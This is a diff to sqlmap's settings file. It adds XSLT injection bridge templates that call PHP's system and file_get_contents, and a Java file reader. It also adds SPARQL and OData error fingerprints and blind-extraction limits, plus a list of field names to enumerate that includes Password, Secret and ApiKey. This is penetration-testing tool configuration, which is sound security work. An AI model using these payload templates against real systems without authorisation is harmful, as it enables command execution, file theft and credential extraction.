@@ -20,7 +20,7 @@ from lib.core.enums import OS
 from thirdparty import six
 
 # sqlmap version (<major>.<minor>.<month>.<monthly commit>)
-VERSION = "1.10.8.19"
+VERSION = "1.10.8.20"
 TYPE = "dev" if VERSION.count('.') > 2 and VERSION.split('.')[-1] != '0' else "stable"
 TYPE_COLORS = {"dev": 33, "stable": 90, "pip": 34}
 VERSION_STRING = "sqlmap/%s#%s" % ('.'.join(VERSION.split('.')[:-1]) if VERSION.count('.') > 2 and VERSION.split('.')[-1] == '0' else VERSION, TYPE)
@@ -1268,13 +1268,34 @@ XSLT_ERROR_REGEX = r"(?i)(?:%s)" % '|'.join(regex for _, regex in XSLT_ERROR_SIG
 # engine speaking rather than the application echoing.
 XSLT_VENDOR_PROPERTIES = ("xsl:vendor", "xsl:version", "xsl:vendor-url", "xsl:product-name", "xsl:product-version")
 
-# Extension surfaces that would turn XSLT injection into code execution or a file WRITE. sqlmap reports
-# their availability and never invokes them - probing whether a function EXISTS is not exercising it.
-XSLT_RCE_PROBES = (
-    ("PHP registerPHPFunctions (php:function)", "string(function-available('php:function'))"),
+# Extension bridges that turn XSLT injection into arbitrary file read and, on some engines, command
+# execution. An injection has to land in the ELEMENT slot to reach one: the value slot cannot bind the
+# namespace prefix the extension needs. function-available() is NOT trustworthy here (Xalan answers
+# 'false' for a working java: call), so each read/exec bridge is confirmed by EVALUATION - a
+# deterministic self-check whose result the application cannot produce by itself - not by asking whether
+# the function "exists". Read/exec templates take one %s, an already-quoted XPath string literal.
+XSLT_BRIDGE_PHP = "php"
+XSLT_BRIDGE_JAVA = "java"
+
+# label, kind, ns-prefix, ns-uri, read-template, exec-template (None where that engine has no exec bridge)
+XSLT_BRIDGES = (
+    ("PHP registerPHPFunctions (php:function)", XSLT_BRIDGE_PHP, "php", "http://php.net/xsl",
+     "php:function('file_get_contents',%s)", "php:function('system',%s)"),
+    # Xalan is READ-ONLY here on purpose: java:...Scanner over a File reads any file reliably, but the
+    # java: bridge does not stringify a Process stdout back into the result tree, so Runtime.exec would
+    # run BLIND with no captured output - offering '--os-cmd' that silently returns nothing is worse than
+    # not offering it (a destructive command would look like it never ran). Hence no exec template.
+    ("Xalan java: extension namespace", XSLT_BRIDGE_JAVA, "java", "http://xml.apache.org/xalan/java",
+     "java:next(java:useDelimiter(java:java.util.Scanner.new(java:java.io.File.new(%s)),'\\Z'))",
+     None),
+)
+
+# File WRITE / eval surfaces that sqlmap reports but does NOT drive: exsl:document writes to the target
+# filesystem (destructive, '--file-write' territory) and saxon:eval needs Saxon-PE/EE. Their mere
+# availability is the finding. Each is (label, boolean XPath self-check that answers 'true').
+XSLT_ADVISORY_PROBES = (
     ("EXSLT exsl:document (file write)", "string(element-available('exsl:document'))"),
     ("Saxon saxon:eval", "string(function-available('saxon:eval'))"),
-    ("Xalan java: extension namespace", "string(function-available('java:java.lang.Runtime.getRuntime'))"),
 )
 
 XSLT_MAX_FILE_LENGTH = 65536
@@ -1437,6 +1458,62 @@ HQL_COMMON_ENTITIES = (
     "Profile", "Role", "Client", "Contact", "Company", "Product", "Order",
     "Item", "Article", "Post", "Comment", "Category", "Document", "File",
     "Message", "Group", "Session", "Token", "Application", "Setting",
+)
+
+# SPARQL injection ('--sparql'). Error signatures per triple-store for heuristic detection and
+# fingerprinting, anchored to product-specific strings (not the bare "MalformedQueryException" /
+# "Encountered" that several engines share) so they stay exclusive from the other non-SQL engines.
+# Each tuple is (engine_name, regex_fragment).
+SPARQL_ERROR_SIGNATURES = (
+    ("Apache Jena / Fuseki", r"org\.apache\.jena|com\.hp\.hpl\.jena|Lexical error at line \d+, column \d+|\bQueryParseException\b"),
+    ("Virtuoso", r"Virtuoso \d+ Error|SPARQL (?:compiler|query):|\bSP03\d\b"),
+    # NOTE 'MalformedQueryException' is the RDF4J/Sesame API type, which Blazegraph and Stardog raise
+    # too - matching on it alone mislabelled them as RDF4J, so only the package name is kept
+    ("RDF4J / GraphDB", r"org\.eclipse\.rdf4j|org\.openrdf\.query"),
+    ("Blazegraph", r"com\.bigdata\.rdf|\bBlazegraph\b"),
+    ("rdflib", r"rdflib\.plugins\.sparql|\bParseException\b.*?(?:SPARQL|sparql)"),
+    ("Stardog", r"com\.(?:complexible\.)?stardog"),
+)
+
+SPARQL_ERROR_REGEX = r"(?i)(?:%s)" % '|'.join(regex for _, regex in SPARQL_ERROR_SIGNATURES)
+
+# Printable-ASCII codepoint bounds for the (lexicographic, binary-search) SPARQL blind character scan
+SPARQL_CHAR_MIN = 0x20
+SPARQL_CHAR_MAX = 0x7e
+
+# Bounds on blind SPARQL extraction (each unit costs many requests, so keep them sane)
+SPARQL_MAX_LENGTH = 1024        # an IRI or literal can be long
+SPARQL_MAX_PREDICATES = 64      # distinct predicates enumerated from the default graph
+SPARQL_MAX_RECORDS = 64         # triples dumped from the default graph
+
+# OData injection ('--odata'). $filter parser error signatures per framework, anchored to product strings
+# so they stay exclusive from the other non-SQL engines. Each tuple is (framework_name, regex_fragment).
+ODATA_ERROR_SIGNATURES = (
+    ("Microsoft OData (WebAPI/.NET)", r"Microsoft\.OData|Microsoft\.Data\.OData|The query specified in the URI is not valid|Could not find a property named|There is an unterminated string literal at position|Syntax error at position \d+ in"),
+    ("Apache Olingo (Java)", r"org\.apache\.olingo|The URI is malformed|Invalid OData"),
+    ("OData4j / other", r"\bodata4j\b|An error occurred while processing the OData request"),
+)
+
+ODATA_ERROR_REGEX = r"(?i)(?:%s)" % '|'.join(regex for _, regex in ODATA_ERROR_SIGNATURES)
+
+# Printable-ASCII codepoint bounds for the (lexicographic, binary-search) OData blind character scan
+ODATA_CHAR_MIN = 0x20
+ODATA_CHAR_MAX = 0x7e
+
+ODATA_MAX_LENGTH = 256          # a single property value
+ODATA_MAX_RECORDS = 20          # entities blind-dumped
+ODATA_MAX_KEY = 100000          # upper bound when bisecting for the lowest existing numeric key
+
+# Candidate key properties probed to pin an entity for row-by-row extraction (real-world frequency order)
+ODATA_KEY_CANDIDATES = ("Id", "ID", "Key", "Oid", "Guid", "Uuid", "Code", "No", "Number")
+
+# Common string property names enumerated once injection is confirmed (an unknown property makes the
+# whole $filter error, so existence is a clean null-probe oracle). Ordered by real-world frequency.
+ODATA_COMMON_FIELDS = (
+    "Name", "Title", "Description", "Username", "UserName", "User", "Login", "Email", "Mail",
+    "Password", "Passwd", "Secret", "Token", "ApiKey", "Key", "Role", "FirstName", "LastName",
+    "FullName", "Phone", "Address", "City", "Country", "Status", "Type", "Code", "Hash", "Salt",
+    "Note", "Comment", "Value", "Content", "Data", "Owner", "Category", "Product", "Company",
 )
 
 XXE_IMPACT_FILES = (
